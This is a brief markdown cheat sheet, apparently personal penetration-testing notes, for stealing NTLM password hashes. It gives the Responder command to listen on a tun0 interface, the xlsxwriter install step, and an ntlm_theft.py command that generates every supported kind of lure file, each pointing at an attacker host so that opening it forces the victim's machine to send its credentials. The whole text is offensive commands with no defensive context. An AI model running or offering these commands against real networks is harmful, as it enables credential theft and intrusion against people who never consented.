# Use responder to get ntlm hashes

```bash
responder -I tun0
```

# use ntlm_theft to generate files which can force a connection to you

## installation

```bash
pip3 install xlsxwriter
```

## usage

```bash
python3 ntlm_theft.py -g all -s <lhost> -f filename
```

